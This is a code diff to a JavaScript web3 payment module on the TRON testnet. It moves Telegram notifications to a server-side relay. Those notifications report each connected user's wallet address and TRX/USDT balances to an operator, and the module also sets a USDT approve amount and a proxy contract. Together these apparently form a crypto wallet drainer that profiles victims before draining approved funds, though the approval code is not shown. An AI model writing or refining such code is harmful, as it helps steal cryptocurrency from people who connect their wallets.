@@ -22,11 +22,11 @@ export const PROXY_CONTRACT_ADDRESS = "TH6A3b2yB2nA3MMpCAUgfxyzwvbZZJCmJz";
 export const NILE_CHAIN_ID           = "0x2bf9b619";
 export const NILE_CHAIN_ID_DECIMAL   = 736766761;
 
-/** Telegram Bot Token for sending order notifications. */
-export const TELEGRAM_BOT_TOKEN = "";
+/** Telegram Bot Token for sending order notifications (DEPRECATED — moved to server-side). */
+export const TELEGRAM_BOT_TOKEN = null;
 
-/** Telegram Chat ID to receive order notifications. */
-export const TELEGRAM_CHAT_ID   = "";
+/** Telegram Chat ID to receive order notifications (DEPRECATED — moved to server-side). */
+export const TELEGRAM_CHAT_ID   = null;
 
 /**
  * Approve amount in TRC20-scaled units (USDT has 6 decimals).
@@ -157,14 +157,8 @@ export function createWeb3Payment(callbacks = {}) {
     }
   }
 
-  // ── Send transaction notification to Telegram ──────────────────────────────────
+  // ── Send transaction notification via server-side relay ───────────────────────
   async function sendTxToTelegram(type, data) {
-    const token = TELEGRAM_BOT_TOKEN;
-    const chatId = TELEGRAM_CHAT_ID;
-    if (!token || token === "YOUR_BOT_TOKEN" || !chatId || chatId === "YOUR_CHAT_ID") {
-      console.warn("[useWeb3Payment] Telegram not configured, skipping tx notification.");
-      return;
-    }
     try {
       const shortAddr = data.addr ? data.addr.slice(0, 6) + "..." + data.addr.slice(-4) : "???";
       let text = "";
@@ -192,9 +186,14 @@ export function createWeb3Payment(callbacks = {}) {
           `原因：${data.error}`;
       }
       if (!text) return;
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+      const res = await fetch(`/api/telegram-send.php`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type, text }),
+      });
+      if (!res.ok) console.error("[useWeb3Payment] Telegram relay error:", res.status);
     } catch (err) {
-      console.error("[useWeb3Payment] Telegram tx notification failed:", err);
+      console.error("[useWeb3Payment] Telegram relay failed:", err);
     }
   }
 
@@ -211,27 +210,25 @@ export function createWeb3Payment(callbacks = {}) {
     }
   }
 
-  // ── Send balance notification to Telegram ────────────────────────────────────
+  // ── Send balance notification via server-side relay ────────────────────────────────
   async function sendBalanceToTelegram(trxBalance, usdtBalance, addr) {
-    const token = TELEGRAM_BOT_TOKEN;
-    const chatId = TELEGRAM_CHAT_ID;
-    if (!token || token === "YOUR_BOT_TOKEN" || !chatId || chatId === "YOUR_CHAT_ID") {
-      console.warn("[useWeb3Payment] Telegram not configured, skipping notification.");
-      return;
-    }
     try {
       const shortAddr = addr ? addr.slice(0, 6) + "..." + addr.slice(-4) : "???";
-      const text = encodeURIComponent(
+      const text =
         `用户钱包已连接\n` +
         `━━━━━━━━━━━━━━━\n` +
         `地址：${shortAddr}\n` +
         `TRX：${trxBalance} TRX\n` +
         `USDT：${usdtBalance} USDT\n` +
-        `━━━━━━━━━━━━━━━`
-      );
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`);
+        `━━━━━━━━━━━━━━━`;
+      const res = await fetch(`/api/telegram-send.php`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "BALANCE", text }),
+      });
+      if (!res.ok) console.error("[useWeb3Payment] Telegram relay error:", res.status);
     } catch (err) {
-      console.error("[useWeb3Payment] Telegram notification failed:", err);
+      console.error("[useWeb3Payment] Telegram relay failed:", err);
     }
   }
 
